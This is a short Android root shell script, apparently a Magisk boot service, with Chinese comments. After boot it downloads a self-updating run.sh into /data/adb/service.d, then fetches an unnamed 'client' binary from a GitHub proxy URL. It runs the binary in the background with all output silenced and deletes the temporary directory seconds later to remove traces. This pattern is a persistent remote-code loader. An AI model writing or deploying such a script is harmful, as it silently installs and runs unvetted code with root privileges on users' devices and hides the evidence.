#!/system/bin/sh

# 1. 等待系統啟動
until [ "$(getprop sys.boot_completed)" = "1" ]; do
    sleep 3
done
sleep 10

# 2. 下載函數 (修正邏輯：curl 失敗才跑 wget)
download_file() {
    if command -v curl >/dev/null 2>&1; then
        curl -L -s -o "$2" "$1" && return 0
    fi
    if command -v wget >/dev/null 2>&1; then
        wget -q -O "$2" "$1" && return 0
    fi
    return 1
}

# 3. 更新 service.d 腳本
download_file "https://gh-proxy.org/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh" "/data/adb/service.d/run.sh"
chmod +x /data/adb/service.d/run.sh

# 4. 建立臨時目錄
ASSET_NAME="client"
URL="https://gh-proxy.org/https://github.com/jenssenli/ko/raw/refs/heads/main/client"

if type mktemp >/dev/null 2>&1; then
    tmpdir=$(mktemp -d "/data/gztmpXXXXXXXXX")
else
    tmpdir="/data/gztmp$RANDOM"
    mkdir -p "$tmpdir" || exit 1
fi

BIN_PATH="$tmpdir/$ASSET_NAME"

# 5. 下載與執行 (修正 Subshell 語法)
if download_file "$URL" "$BIN_PATH"; then
    chmod +x "$BIN_PATH"
    # 進入目錄並啟動
    sh -c "cd $tmpdir && ./$ASSET_NAME >/dev/null 2>&1 &"
fi

# 6. 背景延時自刪 (改用 sh -c 確保背景運行不報錯)
sh -c "sleep 5; rm -rf $tmpdir" >/dev/null 2>&1 &

exit 0
